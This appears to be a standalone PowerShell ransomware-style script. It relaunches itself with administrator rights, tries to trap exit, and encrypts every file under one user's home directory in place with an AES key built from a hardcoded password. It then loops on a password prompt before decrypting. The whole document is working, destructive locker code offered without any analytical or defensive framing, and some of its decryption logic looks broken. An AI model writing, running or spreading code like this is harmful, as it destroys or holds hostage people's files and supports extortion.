# Check if the current script is running as administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relaunch the script as an administrator
    Start-Process powershell.exe "-File $($MyInvocation.MyCommand.Path)" -Verb RunAs
    exit
}

# Trap the exit signal
Register-EngineEvent PowerShell.Exiting -Action {
    $confirm = Read-Host "Are you sure you want to exit? (Y/N)"
    if ($confirm -ne 'Y') {
        # Cancel the exit
        $null = $MyInvocation.MyCommand.ScriptBlock
    }
} -SupportEvent

# Generate AES key from password
$password = "BI-127"
$key = [System.Text.Encoding]::UTF8.GetBytes($password.PadRight(32, ' ')) # Ensure the key is 32 bytes (256 bits)
$iv = New-Object byte[] 16
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($iv)

# Save the IV securely
Set-Content -Path "C:\Windows\TEMP\iv.txt" -Value ([Convert]::ToBase64String($iv))

# Function to encrypt a file
function Protect-Files {
    param (
        [string]$filePath
    )
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv

    $cryptoTransform = $aes.CreateEncryptor()

    # Read the file content
    try {
        $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    } catch {
        Write-Host "Failed to read file $filePath"
        return
    }
    
    # Encrypt the file content
    try {
        $encryptedContent = $cryptoTransform.TransformFinalBlock($fileContent, 0, $fileContent.Length)
    } catch {
        Write-Host "Failed to encrypt file $filePath"
        return
    }

    # Try to write the encrypted content to the file and ignore any errors
    try {
        [System.IO.File]::WriteAllBytes($filePath, $encryptedContent)
    } catch {
        # Ignore the error
    }
}

# Encrypt all files in the specified directory and its subdirectories
$targetDirectory = "C:\Users\finn"
$markerFile = Join-Path $targetDirectory "encryption_done.marker"

if (Test-Path $markerFile) {
    # Marker file exists, skip the encryption phase
    Write-Host "Files are already encrypted. Skipping encryption phase."
} else {
    # Marker file does not exist, start the encryption phase
    $targetDirectory = "C:\Users\finn"
    Get-ChildItem -Path $targetDirectory -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object {
        Protect-Files -filePath $_.FullName

    # Create the marker file
    New-Item -Path $markerFile -ItemType File -ErrorAction SilentlyContinue -Force | Out-Null
    }
}

Write-Host "Encryption complete. All files under $targetDirectory have been encrypted."

# Function to decrypt a file
function Unprotect-Files {
    param (
        [string]$filePath
    )
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv

    $cryptoTransform = $aes.CreateDecryptor()
    
    # Read the file content
    try {
        $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    } catch {
        Write-Host "Failed to read file $filePath"
        return
    }

    # Decrypt the file content
    try {
        $decryptedContent = $cryptoTransform.TransformFinalBlock($fileContent, 0, $fileContent.Length)
    } catch {
        Write-Host "Failed to decrypt file $filePath"
        return
    }

    # Try to write the encrypted content to the file and ignore any errors
    try {
        [System.IO.File]::WriteAllBytes($filePath, $decryptedContent)
    } catch {
        # Ignore the error
    }
}

# Continuously prompt for the correct password
do {
    # Prompt for password
    $passwordInput = Read-Host "Enter password to decrypt files"
    $password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordInput))

    if ($password -eq "BI-127") {
        # Generate AES key from password
        $key = [System.Text.Encoding]::UTF8.GetBytes($password.PadRight(32, ' '))
        $iv = [Convert]::FromBase64String((Get-Content -Path "C:\Windows\TEMP\iv.txt"))

        # Decrypt all files in the specified directory and its subdirectories
        $targetDirectory = "C:\Users\finn"
        Get-ChildItem -Path $targetDirectory -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object {
            Unprotect-Files -filePath $_.FullName
        }

        # Delete the marker file
        Remove-Item -Path $markerFile -ErrorAction Ignore
        
        Write-Host "Files decrypted successfully."
        break
    } else {
        Write-Host "Incorrect password. Please try again."
    }
} while ($true)